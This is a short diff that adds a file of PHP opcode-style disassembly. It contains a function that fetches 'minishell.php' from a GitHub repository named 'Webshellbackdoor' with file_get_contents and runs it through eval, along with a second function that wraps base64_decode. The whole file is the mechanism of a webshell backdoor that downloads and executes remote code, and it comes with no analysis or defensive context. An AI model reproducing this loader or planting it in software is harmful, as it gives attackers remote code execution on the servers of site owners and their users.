@@ -1,0 +1,16 @@
+FunctionStart 
+ASSIGN 'https://raw.githubusercontent.com/alarcidk/Webshellbackdoor/main/minishell.php'
+INIT_FCALL 'date_custom'
+DO_FCALL 
+INIT_FCALL 'file_get_contents'
+DO_ICALL 
+CONCAT '?>'
+INCLUDE_OR_EVAL 'EVAL'
+RETURN 1
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'base64_decode'
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
